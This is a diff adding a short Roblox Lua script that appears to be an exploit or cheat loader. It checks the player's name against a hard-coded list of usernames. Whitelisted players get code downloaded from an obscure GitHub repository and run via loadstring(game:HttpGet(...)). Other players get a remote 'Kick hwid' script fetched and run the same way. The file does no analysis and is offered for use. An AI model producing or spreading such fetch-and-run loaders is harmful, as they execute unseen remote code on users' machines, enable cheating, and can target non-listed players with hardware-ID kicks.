@@ -1,0 +1,20 @@
+local whitelist= {}
+
+whitelist = {
+    "Ali_thepirosf",
+    "Practiceaccount786",
+    "AHMED_YT1233",
+    "icezzy2192",
+    "Only_Kavara",
+    "lexvJones",
+    "021_ivanjr",
+    "Jahqiavakacakga"
+}
+
+local plr = game.Players.LocalPlayer
+local name = game.Players.LocalPlayer.Name
+if table.find(whitelist, name) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hcuifhebedi/xufpo0jxjj--/main/Pedjidjdjdhidjm"))()
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yBloodz/TPS-script/main/Kick%20hwid"))()
+end
